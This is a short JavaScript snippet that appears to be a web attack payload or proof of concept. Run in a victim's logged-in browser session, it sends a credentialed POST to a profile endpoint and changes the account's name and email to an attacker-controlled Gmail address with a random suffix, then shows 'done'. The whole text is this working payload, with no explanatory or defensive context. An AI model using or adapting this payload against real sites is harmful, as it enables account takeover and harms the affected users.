var xhr=new XMLHttpRequest()
xhr.open("POST","/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
xhr.withCredentials=true;
xhr.onreadystatechange=()=>{if(xhr.readyState==4){
alert('done')
}}
xhr.send(`__rvfInternalFormId=ProfileForm&given_name=test&family_name=test&email=vampire01${Math.floor(Math.random() * (1000)) + 100 }%40gmail.com&mobile_number=`);
